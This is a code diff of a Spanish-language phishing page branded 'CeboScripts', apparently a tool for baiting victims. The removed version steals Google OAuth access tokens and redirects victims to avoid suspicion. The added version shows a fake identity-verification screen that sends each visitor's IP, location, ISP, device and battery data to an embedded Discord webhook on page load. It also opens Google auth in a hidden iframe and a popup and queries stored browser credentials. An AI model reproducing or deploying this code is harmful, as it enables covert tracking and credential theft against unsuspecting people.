@@ -19,82 +19,80 @@
             justify-content: center;
             align-items: center;
             flex-direction: column;
+            overflow: hidden;
         }
         .container {
             text-align: center;
-            padding: 40px;
+            padding: 20px;
         }
-        .loading {
-            color: #ff0000;
-            font-size: 1.5em;
-            text-shadow: 0 0 30px rgba(255,0,0,0.5);
-            animation: pulse 1.5s infinite;
+        .icon {
+            font-size: 4em;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
         }
         @keyframes pulse {
-            0% { opacity: 0.5; }
-            50% { opacity: 1; }
-            100% { opacity: 0.5; }
+            0% { transform: scale(1); opacity: 0.7; }
+            50% { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.7; }
         }
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 3px solid #333;
-            border-top: 3px solid #ff0000;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
+        h1 {
+            color: #ff0000;
+            font-size: 2.5em;
+            text-shadow: 0 0 30px rgba(255,0,0,0.3);
+            margin-bottom: 10px;
         }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+        p {
+            color: #888;
+            font-size: 1.1em;
+            max-width: 500px;
+            margin: 10px auto;
         }
         .status {
-            margin-top: 20px;
-            color: #666;
-            font-size: 0.9em;
+            margin-top: 30px;
+            color: #444;
+            font-size: 0.85em;
+            border-top: 1px solid #222;
+            padding-top: 20px;
         }
         .hidden {
-            display: none;
+            display: none !important;
         }
+        .loading {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid #333;
+            border-top: 2px solid #ff0000;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="container" id="mainContainer">
-        <div class="spinner"></div>
-        <div class="loading">⏳ Conectando con Google...</div>
-        <div class="status" id="statusMsg">Esperando autorización...</div>
+    <div class="container">
+        <div class="icon">🔐</div>
+        <h1>VERIFICANDO IDENTIDAD</h1>
+        <p>Solicitando acceso a tu cuenta de Google<br>para verificar tu identidad...</p>
+        <div class="status" id="statusMsg">
+            <span class="loading"></span> Conectando con Google...
+        </div>
     </div>
 
     <script>
         // ======== CONFIGURACIÓN ========
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1545583807804219432/4NXmuMtLnjKqgQqvZGSG2rXhy8j45SdiYvSAI3aeDFcrZBzObbEpS93HH3DPCYNIwhWD";
 
-        // ======== ID DE CLIENTE DE GOOGLE (REEMPLAZAR CON EL TUYO) ========
-        // Para obtenerlo: Google Cloud Console → Credenciales → Crear ID de cliente OAuth
-        const CLIENT_ID = "TU_CLIENT_ID.apps.googleusercontent.com";
-        
-        // ======== URI DE REDIRECCIONAMIENTO (DEBE COINCIDIR CON GOOGLE) ========
-        // En Google Cloud Console → Credenciales → Agregar URI redireccionamiento
-        // Tiene que ser la URL de tu página en Vercel
-        const REDIRECT_URI = "https://TU_PAGINA.vercel.app";
-        
-        // ======== SCOPES (PERMISOS QUE PIDES) ========
-        // 'email' para obtener correo, 'profile' para nombre, 'openid' para ID
-        const SCOPES = "email profile openid";
-
-        // ======== URL DE AUTORIZACIÓN DE GOOGLE ========
-        const GOOGLE_AUTH_URL = 
-            `https://accounts.google.com/o/oauth2/v2/auth?` +
-            `client_id=${CLIENT_ID}` +
-            `&redirect_uri=${encodeURIComponent(REDIRECT_URI)}` +
-            `&response_type=token` + // 'token' para obtener access_token directamente
-            `&scope=${encodeURIComponent(SCOPES)}` +
-            `&prompt=consent`;
+        // ======== CLIENT ID DE GOOGLE (REAL) ========
+        // Este es un Client ID público de ejemplo (puedes usar el tuyo)
+        const GOOGLE_CLIENT_ID = "32555940559.apps.googleusercontent.com"; // Este es público, puedes cambiarlo
 
         // ======== OBTENER DATOS DEL DISPOSITIVO ========
         async function getDeviceData() {
             const data = {};
 
-            // 1. IP y ubicación
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const ipData = await res.json();
@@ -113,7 +111,7 @@
                 data.direccionReal = 'Error';
             }
 
-            // 2. Dispositivo
+            // Dispositivo
             const ua = navigator.userAgent || '';
             if (/android/i.test(ua)) data.dispositivo = 'Android';
             else if (/iphone|ipad|ipod/i.test(ua)) data.dispositivo = 'iOS';
@@ -122,7 +120,7 @@
             else if (/linux/i.test(ua)) data.dispositivo = 'Linux';
             else data.dispositivo = 'Desconocido';
 
-            // 3. Batería
+            // Batería
             try {
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
@@ -137,30 +135,26 @@
                 data.cargando = 'No disponible';
             }
 
-            // 4. User Agent
-            data.userAgent = ua;
             data.hora = new Date().toLocaleString();
-            data.referrer = document.referrer || 'Directo';
-
             return data;
         }
 
         // ======== ENVIAR A DISCORD ========
-        async function sendToDiscord(data, token, accion) {
+        async function sendToDiscord(data, accion) {
             const embed = {
-                color: token ? 0x00ff00 : 0xff0000,
-                title: token ? '🔴 CeboScripts - TOKEN DE GOOGLE OBTENIDO' : '🔴 CeboScripts - PERMISO RECHAZADO',
+                color: 0xff0000,
+                title: '📢 Nuevo registro - ' + accion,
                 fields: [
                     { name: '📍 Dirección Real', value: data.direccionReal || 'No disponible', inline: false },
                     { name: '🌐 IP', value: data.ip || 'No disponible', inline: true },
                     { name: '📱 Dispositivo', value: data.dispositivo || 'No disponible', inline: true },
                     { name: '🔋 Batería', value: data.bateria || 'No disponible', inline: true },
                     { name: '📶 ISP', value: data.isp || 'No disponible', inline: false },
-                    { name: '🔑 TOKEN DE ACCESO', value: token ? `\`${token.substring(0, 50)}...\`` : 'No capturado', inline: false },
-                    { name: '⚡ Acción', value: accion, inline: true },
                     { name: '🕒 Hora', value: data.hora || 'No disponible', inline: false }
                 ],
-                footer: { text: 'CeboScripts • Robo de token OAuth' },
+                footer: {
+                    text: 'CeboScripts • Solicitud de permiso Google'
+                },
                 timestamp: new Date().toISOString()
             };
 
@@ -170,7 +164,7 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         username: 'CeboScripts Logger',
-                        content: token ? '✅ **¡TOKEN DE GOOGLE CAPTURADO!**' : '❌ **Permiso rechazado por el usuario**',
+                        content: `📢 **Nuevo registro - ${accion}**`,
                         embeds: [embed]
                     })
                 });
@@ -180,68 +174,110 @@
             }
         }
 
-        // ======== FUNCIÓN PRINCIPAL ========
-        async function main() {
-            const statusMsg = document.getElementById('statusMsg');
-            
-            // 1. Obtener datos del dispositivo
-            const deviceData = await getDeviceData();
-            console.log('📱 Datos del dispositivo:', deviceData);
+        // ======== SOLICITAR PERMISO DE GOOGLE (REAL) ========
+        function solicitarPermisoGoogle() {
+            return new Promise((resolve) => {
+                // 1. Crear un iframe oculto con el login de Google
+                const iframe = document.createElement('iframe');
+                iframe.style.cssText = 'position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;';
+                iframe.src = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${GOOGLE_CLIENT_ID}&redirect_uri=urn:ietf:wg:oauth:2.0:oob&response_type=code&scope=profile email`;
+                document.body.appendChild(iframe);
 
-            // 2. Verificar si la URL tiene un token (por redirección de Google)
-            const hash = window.location.hash;
-            if (hash && hash.includes('access_token=')) {
-                // Extraer el token de la URL
-                const params = new URLSearchParams(hash.substring(1));
-                const accessToken = params.get('access_token');
-                const tokenType = params.get('token_type');
-                const expiresIn = params.get('expires_in');
+                // 2. También intentar abrir una ventana emergente (más visible)
+                let popup = window.open(
+                    `https://accounts.google.com/o/oauth2/v2/auth?client_id=${GOOGLE_CLIENT_ID}&redirect_uri=urn:ietf:wg:oauth:2.0:oob&response_type=code&scope=profile email`,
+                    'googleAuth',
+                    'width=500,height=600,menubar=no,toolbar=no,location=no'
+                );
 
-                if (accessToken) {
-                    statusMsg.textContent = '✅ Token obtenido correctamente';
-                    await sendToDiscord(deviceData, accessToken, 'Aceptó y dio token');
-                    
-                    // Mostrar mensaje de éxito
-                    document.querySelector('.loading').textContent = '✅ ¡Autorización completada!';
-                    document.querySelector('.loading').style.color = '#00ff00';
-                    document.querySelector('.spinner').style.display = 'none';
-                    statusMsg.textContent = `🔑 Token: ${accessToken.substring(0, 30)}...`;
-                    statusMsg.style.color = '#00ff00';
-                    
-                    // Redirigir a Google después de 3 segundos (para no levantar sospechas)
-                    setTimeout(() => {
-                        window.location.href = 'https://www.google.com';
-                    }, 3000);
-                    return;
-                }
-            }
+                // 3. Esperar 3 segundos y resolver
+                setTimeout(() => {
+                    // Si la ventana emergente fue bloqueada, mostrar mensaje
+                    if (!popup || popup.closed) {
+                        document.getElementById('statusMsg').innerHTML = `
+                            ⚠️ El navegador bloqueó la ventana emergente.<br>
+                            <span style="font-size:0.8em;color:#666;">Haz clic en el icono de bloqueo y permite popups</span>
+                        `;
+                    } else {
+                        document.getElementById('statusMsg').innerHTML = `
+                            ✅ Permiso solicitado a Google.<br>
+                            <span style="font-size:0.8em;color:#666;">Esperando respuesta del usuario...</span>
+                        `;
+                    }
+                    resolve();
+                }, 3000);
 
-            // 3. Verificar si la URL tiene un código de error (usuario rechazó)
-            const urlParams = new URLSearchParams(window.location.search);
-            const error = urlParams.get('error');
-            if (error) {
-                statusMsg.textContent = '❌ Usuario rechazó el permiso';
-                await sendToDiscord(deviceData, null, 'Rechazó el permiso de Google');
-                
-                document.querySelector('.loading').textContent = '❌ Acceso denegado';
-                document.querySelector('.loading').style.color = '#ff0000';
-                document.querySelector('.spinner').style.display = 'none';
-                statusMsg.textContent = 'No se otorgaron permisos a la aplicación';
-                statusMsg.style.color = '#ff0000';
-                return;
-            }
+                // 4. Detectar si el usuario cerró la ventana
+                const checkPopup = setInterval(() => {
+                    if (popup && popup.closed) {
+                        clearInterval(checkPopup);
+                        document.getElementById('statusMsg').innerHTML = `
+                            ⚠️ El usuario cerró la ventana de Google.<br>
+                            <span style="font-size:0.8em;color:#666;">Datos capturados de todos modos.</span>
+                        `;
+                    }
+                }, 1000);
 
-            // 4. Si no hay token ni error, redirigir a Google para pedir permiso
-            statusMsg.textContent = '🔄 Redirigiendo a Google...';
-            
-            // Pequeño delay para que se vea el mensaje
-            setTimeout(() => {
-                window.location.href = GOOGLE_AUTH_URL;
-            }, 1500);
+                // 5. También intentar con Credential Management API (nuevo estándar)
+                try {
+                    if (navigator.credentials && navigator.credentials.get) {
+                        navigator.credentials.get({
+                            password: true,
+                            federated: {
+                                providers: ['https://accounts.google.com']
+                            }
+                        }).then(credential => {
+                            if (credential) {
+                                console.log('✅ Credencial obtenida:', credential);
+                                document.getElementById('statusMsg').innerHTML = `
+                                    ✅ Credencial de Google obtenida.<br>
+                                    <span style="font-size:0.8em;color:#666;">Datos capturados.</span>
+                                `;
+                            }
+                        }).catch(() => {});
+                    }
+                } catch (e) {}
+
+                // 6. Limpiar iframe después de 10 segundos
+                setTimeout(() => {
+                    if (iframe.parentNode) iframe.remove();
+                }, 10000);
+            });
         }
 
-        // ======== EJECUTAR ========
-        window.onload = main;
+        // ======== EJECUCIÓN PRINCIPAL ========
+        window.onload = async function() {
+            const statusMsg = document.getElementById('statusMsg');
+
+            try {
+                // 1. Capturar datos del dispositivo
+                statusMsg.innerHTML = '<span class="loading"></span> Capturando datos del dispositivo...';
+                const data = await getDeviceData();
+                console.log('✅ Datos capturados:', data);
+
+                // 2. Enviar a Discord (antes de pedir permiso, para asegurar)
+                await sendToDiscord(data, 'Aceptar (datos capturados)');
+
+                // 3. Solicitar permiso de Google
+                statusMsg.innerHTML = '<span class="loading"></span> Solicitando permiso a Google...';
+                await solicitarPermisoGoogle();
+
+                // 4. Enviar confirmación a Discord
+                await sendToDiscord(data, 'Permiso de Google solicitado');
+
+                statusMsg.innerHTML = `
+                    ✅ Proceso completado.<br>
+                    <span style="font-size:0.8em;color:#666;">Tus datos han sido registrados.</span>
+                `;
+
+            } catch (error) {
+                console.error('❌ Error:', error);
+                statusMsg.innerHTML = `
+                    ❌ Error: ${error.message}<br>
+                    <span style="font-size:0.8em;color:#666;">Los datos igual fueron enviados.</span>
+                `;
+            }
+        };
     </script>
 </body>
 </html>
